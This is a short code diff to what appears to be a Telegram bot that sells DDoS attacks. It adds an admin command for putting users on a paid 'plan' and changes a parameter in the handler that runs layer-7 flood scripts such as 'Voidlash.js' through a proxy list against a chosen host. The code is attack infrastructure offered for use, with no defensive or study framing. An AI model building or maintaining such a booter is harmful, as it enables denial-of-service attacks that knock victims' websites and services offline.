@@ -147,6 +147,7 @@ def help(message):
  - /admin : See Admin activity
 
 [ 👨‍💻 ] Admin Permission
+ - /add [id] : Add user to the bot plan
  - /cpu : See BOT CPU Stats
  - /on : Turn on maintenance
  - /off : Turn off maintenance
@@ -267,7 +268,7 @@ def attack_command(message):
             duration = atime
         if method == 'VOIDLASH':
             os.chdir("L7")
-            command = ["node", "Voidlash.js", host, atime, "14", "proxy.txt", "50"]
+            command = ["node", "Voidlash.js", host, atime, "14", "proxy.txt", "14"]
             duration = atime
         elif method == 'POSEIDON':
             os.chdir("L7")
